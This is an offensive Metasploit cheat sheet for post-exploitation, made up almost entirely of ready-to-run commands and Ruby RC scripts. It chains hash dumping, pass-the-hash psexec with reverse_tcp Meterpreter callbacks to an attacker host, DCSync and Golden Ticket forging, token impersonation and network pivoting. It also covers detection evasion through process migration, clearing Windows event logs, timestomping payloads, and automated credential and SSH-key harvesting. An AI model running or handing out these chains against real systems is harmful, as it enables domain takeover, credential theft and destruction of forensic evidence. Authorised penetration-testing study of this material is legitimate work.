# Advanced Metasploit Post-Exploitation Techniques

## Advanced Credential Chains

### Chain 1: SAM â†’ Pass-the-Hash â†’ DCSync â†’ Golden Ticket
```
# Step 1: Dump SAM from compromised host
hashdump
# â†’ Administrator:500:aad3b...:e19ccf75ee54e06b..:::

# Step 2: PsExec to DC with admin hash
background
use exploit/windows/smb/psexec
set RHOSTS <DC_IP>
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
exploit

# Step 3: DCSync from DC session
sessions -i <DC_SESSION>
load kiwi
kiwi_cmd "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt"
# â†’ krbtgt NTLM hash

# Step 4: Golden Ticket (persistence + any user impersonation)
kiwi_cmd "kerberos::golden /user:fakeadmin /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /ptt"
```

### Chain 2: Token Theft â†’ Credential Dump â†’ Lateral
```
# Step 1: Find interesting tokens
load incognito
list_tokens -u
# â†’ DOMAIN\DomainAdmin (Delegation)

# Step 2: Impersonate DA token
impersonate_token "DOMAIN\\DomainAdmin"

# Step 3: Access DC admin share
shell
dir \\DC01\C$\Users\
exit

# Step 4: Dump from DC via new session
background
use exploit/windows/smb/psexec
set RHOSTS <DC_IP>
set SMBUser DomainAdmin
# (token used automatically through session routing)
exploit
```

### Chain 3: Web Shell â†’ Meterpreter â†’ SYSTEM â†’ Hashdump â†’ Pivot â†’ Full Compromise
```
# Step 1: Upgrade web shell to Meterpreter
sessions -u <WEBSHELL_SESSION>

# Step 2: Elevate to SYSTEM
getsystem
# If fails:
run post/multi/recon/local_exploit_suggester
# â†’ use suggested exploit

# Step 3: Harvest credentials
hashdump
load kiwi
creds_all

# Step 4: Discover internal network
ipconfig
run autoroute -s <INTERNAL_SUBNET>/24
run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_SUBNET>/24

# Step 5: Lateral movement to discovered hosts
background
use exploit/windows/smb/psexec
set RHOSTS <INTERNAL_HOST>
set SMBUser <HARVESTED_USER>
set SMBPass <HARVESTED_HASH>
exploit

# Step 6: Repeat credential harvest on new host
sessions -i <NEW_SESSION>
hashdump
load kiwi
creds_all
```

## Process Migration Strategies

### Migrate to Avoid Detection
```
# Find stable 64-bit SYSTEM process
ps
# Good targets: svchost.exe, explorer.exe, spoolsv.exe, lsass.exe (risky)

# Migrate
migrate <PID>

# Auto-migrate to specific process
run post/windows/manage/migrate NAME=explorer.exe
run post/windows/manage/migrate NAME=svchost.exe
```

### Architecture-Aware Migration
```
# Check current arch
sysinfo
# If x86 Meterpreter on x64 system â€” MUST migrate for kiwi
ps
# Find x64 process:
migrate <X64_PID>
# Verify:
sysinfo
# â†’ Architecture: x64
```

## Anti-Forensics via Meterpreter

### Event Log Clearing ðŸ”´
```
clearev
# Clears Application, System, and Security logs

# Selective clearing (via shell)
shell
wevtutil cl Security
wevtutil cl Application
wevtutil cl System
wevtutil cl "Windows PowerShell"
exit
```

### Timestomping ðŸŸ¡
```
# Copy timestamps from legitimate file
timestomp C:\\Users\\Public\\payload.exe -f C:\\Windows\\System32\\svchost.exe

# Set specific timestamps
timestomp C:\\Users\\Public\\payload.exe -m "11/25/2023 08:30:00"
timestomp C:\\Users\\Public\\payload.exe -a "11/25/2023 08:30:00"
timestomp C:\\Users\\Public\\payload.exe -c "11/25/2023 08:30:00"
```

## Session Management

### Multi-Session Operations
```
# List all sessions
sessions -l

# Interact with session
sessions -i <ID>

# Kill session
sessions -k <ID>

# Kill all sessions
sessions -K

# Upgrade shell to Meterpreter
sessions -u <ID>

# Run command on all sessions
sessions -C "sysinfo" -i all
```

### Transport Management
```
# Add fallback transport
transport add -t reverse_tcp -l <LHOST> -p 5555 -lu 600 -ct 300

# List transports
transport list

# Switch transport
transport next
transport prev
```

## Automated Post-Exploit RC Scripts

### Full Windows Post-Exploit
```ruby
# save as win_postexploit.rc
<ruby>
framework.sessions.each do |id, session|
  next unless session.type == "meterpreter"
  print_good("=== Session #{id} ===")
  
  # Enumeration
  sysinfo = session.sys.config.sysinfo
  uid = session.sys.config.getuid
  print_line("System: #{sysinfo['Computer']} - #{sysinfo['OS']}")
  print_line("User: #{uid}")
  
  # Try getsystem
  begin
    session.priv.getsystem
    print_good("Got SYSTEM!")
  rescue
    print_warning("getsystem failed â€” will try local exploits")
  end
end
</ruby>

# Credential harvesting
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/smart_hashdump
set SESSION 1
run

# Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Full Linux Post-Exploit
```ruby
# save as linux_postexploit.rc
<ruby>
framework.sessions.each do |id, session|
  next unless session.type == "meterpreter"
  print_good("=== Session #{id} ===")
  sysinfo = session.sys.config.sysinfo
  uid = session.sys.config.getuid
  print_line("System: #{sysinfo['Computer']} - #{sysinfo['OS']}")
  print_line("User: #{uid}")
end
</ruby>

use post/linux/gather/hashdump
set SESSION 1
run

use post/linux/gather/enum_system
set SESSION 1
run

use post/multi/gather/ssh_creds
set SESSION 1
run

use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
